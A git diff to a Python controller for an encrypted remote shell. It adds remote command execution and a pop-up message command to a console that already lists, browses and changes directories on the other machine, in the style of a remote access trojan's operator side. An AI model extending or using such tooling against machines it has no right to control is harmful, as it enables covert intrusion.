@@ -47,7 +47,7 @@ def crypt(message: bytes):
         ))  # Encrypt message
     return ciphertext
 
-def decrypt(message: bytes):
+def decrypt(message: bytes, encode='utf8'):
     mensaje_descifrado = privateKey.decrypt(
         message,
         padding.OAEP(
@@ -55,7 +55,7 @@ def decrypt(message: bytes):
             algorithm=hashes.SHA256(),
             label=None
         ))  # Decrypt message
-    return mensaje_descifrado.decode()
+    return mensaje_descifrado.decode(encode)
 
 client_socket, server_socket, privateKey, remoteKey = connSetup()   # Start Connection
 
@@ -86,14 +86,38 @@ while True:
     elif command == "cd":
         client_socket.send(crypt(str(data).encode()))
 
+    elif command == "messagebox":
+        client_socket.send(crypt(str(data).encode()))
+
+    elif command == "execute":
+        client_socket.send(crypt(str(data).encode()))
+        count = client_socket.recv(8192)
+        count = decrypt(count)
+        try:
+            count = int(count)
+        except:
+            print("An error Ocurred! 0x16")
+        else:
+            out = ""
+            for i in range(count): 
+                raw = client_socket.recv(8192)
+                raw = decrypt(raw, encode='windows-1252')
+                out = out + raw
+                print(out)
+            
     elif command == "help":
         print(f''' 
+This is the help menu, there are 2 types of arguments: < Required > and [ Optional ].
+The commands are divided by sections according to their function and each section is divided into 3 columns: 
+command - description - context (if executed locally or remotely).
+              
 == {color.RED}SHELL{color.WHITE}
 ====================================================
 ls                    List Files              Remote
 pwd                   Print Path              Remote
-cd                    Change Directory        Remote
-clear                 Clear Terminal          Local  \n''')
+cd <Path>             Change Directory        Remote
+clear                 Clear Terminal          Local  
+execute               Run remote commands     Remote \n''')
         change = 1
 
     elif command == "exit":
